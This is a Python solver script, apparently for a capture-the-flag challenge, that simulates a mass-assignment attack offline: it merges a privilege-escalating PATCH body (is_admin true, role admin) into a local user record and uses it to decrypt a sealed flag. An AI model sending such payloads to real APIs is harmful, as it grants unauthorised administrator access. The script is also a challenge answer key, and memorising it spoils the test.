#!/usr/bin/env python3
"""Craft the privileged PATCH body, replay the server logic offline, unseal.

The endpoint merges the request JSON into the user record with no allowlist. We
send the privileged assignment (is_admin=true AND role=admin), then re-run the
/api/me/flag path. The seal key is the canonical JSON of that exact assignment,
so building the right mass-assignment request is what produces the key offline.
"""

import hashlib
import json
import os
import re

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

# The malicious PATCH /api/me body: the privileged mass-assignment.
PAYLOAD = {"is_admin": True, "role": "admin"}
ADMIN_ASSIGNMENT = ("is_admin", "role")


def sealed_hex() -> str:
    src = open(os.path.join(ROOT, "app.py")).read()
    parts = re.findall(r'"([0-9a-f]+)"', src)
    return "".join(p for p in parts if p and all(c in "0123456789abcdef" for c in p))


def keystream(key: bytes, n: int) -> bytes:
    out = b""
    counter = 0
    while len(out) < n:
        out += hashlib.sha256(key + counter.to_bytes(4, "big")).digest()
        counter += 1
    return out[:n]


def main() -> None:
    store = json.load(open(os.path.join(ROOT, "users.json")))
    user = next(u for u in store["users"] if u["id"] == 7)
    assert user["is_admin"] is False

    # PATCH /api/me merges the body wholesale (mass assignment).
    user.update(PAYLOAD)
    assert user["is_admin"] is True and user["role"] == "admin", "escalation failed"

    # GET /api/me/flag: key derived from the privileged assignment on the record.
    assignment = {k: user[k] for k in ADMIN_ASSIGNMENT}
    canonical = json.dumps(assignment, sort_keys=True, separators=(",", ":"))
    key = hashlib.sha256(canonical.encode()).digest()
    ct = bytes.fromhex(sealed_hex())
    flag = bytes(a ^ b for a, b in zip(ct, keystream(key, len(ct)))).decode()
    print(flag)


if __name__ == "__main__":
    main()
